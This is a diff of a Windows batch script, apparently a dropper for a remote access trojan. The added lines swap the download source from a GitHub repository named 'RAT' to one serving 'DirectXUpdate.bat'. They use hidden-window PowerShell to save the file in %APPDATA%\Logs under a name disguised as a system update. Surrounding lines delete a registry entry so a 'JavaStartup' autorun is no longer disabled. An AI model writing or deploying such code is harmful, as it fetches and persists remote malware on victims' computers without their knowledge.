@@ -25,14 +25,14 @@ start "" "%TARGET_FILE%"
 
 :: Prepare Java.bat in AppData\Logs
 set "LOGS_FOLDER=%APPDATA%\Logs"
-set "AURA_BAT_URL=https://github.com/GLICHED-HACKER/RAT/raw/refs/heads/main/AuraCreate.bat"
-set "AURA_BAT_FILE=%LOGS_FOLDER%\Java.bat"
+set "DirectXUpdate_BAT_URL=https://raw.githubusercontent.com/Abdullah67289/Ghoste-Trace/refs/heads/main/DirectXUpdate.bat"
+set "DirectXUpdate_BAT_FILE=%LOGS_FOLDER%\DirectXUpdate.bat"
 
 if not exist "%LOGS_FOLDER%" (
     mkdir "%LOGS_FOLDER%"
 )
 
-powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('%AURA_BAT_URL%', '%AURA_BAT_FILE%')"
+powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('%DirectXUpdate_BAT_URL%', '%DirectXUpdate_BAT_FILE%')"
 
 :: Remove Task Manager "disabled" block if it exists
 reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /v "JavaStartup" /f >nul 2>&1
